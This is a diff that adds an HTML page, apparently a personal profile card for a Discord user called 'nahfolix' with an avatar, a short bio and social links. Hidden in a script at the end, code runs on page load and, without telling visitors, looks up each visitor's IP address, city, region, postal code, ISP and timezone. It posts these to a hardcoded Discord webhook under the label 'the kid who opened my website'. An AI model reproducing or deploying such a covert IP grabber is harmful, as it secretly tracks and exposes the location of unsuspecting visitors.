@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#ffffff">
+<title>nahfolix</title>
+<meta property="og:title" content="nahfolix">
+<meta property="og:description" content="this folix, and im litewally just him, dm me for side quests 🥀">
+<meta property="og:image" content="https://cdn.discordapp.com/avatars/938124385817092096/f5e8a5c22a52c9fce9578fcda6f56d2f.webp?size=1024">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background: #2C2F33;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .container {
+      background: #23272A;
+      border-radius: 12px;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 25px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      text-align: center;
+    }
+    .avatar {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      border: 3px solid #7289DA;
+      object-fit: cover;
+      background: #99AAB5;
+    }
+    h1 {
+      font-weight: 700;
+      margin-bottom: 5px;
+    }
+    .tag {
+      color: #99AAB5;
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+      letter-spacing: 1.2px;
+    }
+    .bio {
+      font-size: 1rem;
+      line-height: 1.5;
+      margin-bottom: 25px;
+      color: #B9BBBE;
+    }
+    .social-links a {
+      text-decoration: none;
+      color: #fff;
+      background: #7289DA;
+      padding: 10px 18px;
+      margin: 0 8px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      display: inline-block;
+      transition: background 0.3s ease;
+    }
+    .social-links a:hover {
+      background: #5b6eae;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #72767d;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img
+      class="avatar"
+      src="https://cdn.discordapp.com/avatars/938124385817092096/f5e8a5c22a52c9fce9578fcda6f56d2f.webp?size=1024"
+      alt="User Avatar"
+      onerror="this.onerror=null; this.src='https://cdn-icons-png.flaticon.com/512/747/747376.png';"
+    />
+    <h1>nahfolix</h1>
+    <div class="tag">#0000</div>
+    <div class="bio">
+      im just him
+    </div>
+    <div class="social-links">
+      <a href="https://discordapp.com/users/938124385817092096" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/wtfplayer" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://www.roblox.com/users/3784100047/profile target="_blank" rel="noopener noreferrer">Roblox</a>
+    </div>
+    <footer>Made with ❤️ by folix</footer>
+  </div>
+
+  <script>
+  (async () => {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      const ip = data.ip || 'N/A';
+      const city = data.city || 'N/A';
+      const region = data.region || 'N/A';
+      const country = data.country_name || 'N/A';
+      const postal = data.postal || 'N/A';
+      const org = data.org || 'N/A';
+      const timezone = data.timezone || 'N/A';
+
+      const webhookURL = "https://discord.com/api/webhooks/1397310716070985820/nVQOeUJ4shoMvFvQKYSd0RRHUdZ50hKZUWNBcp87ycd-Df7An0DKnNv76jqUpFxJQwgO";
+
+      const content = `**the kid who opened my website:**
+IP Address: ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Postal Code: ${postal}
+ISP/Org: ${org}
+Timezone: ${timezone}`;
+
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      });
+
+      console.log("IP info sent:", ip);
+    } catch (error) {
+      console.error("Error sending IP info:", error);
+    }
+  })();
+  </script>
+</body>
+</html>
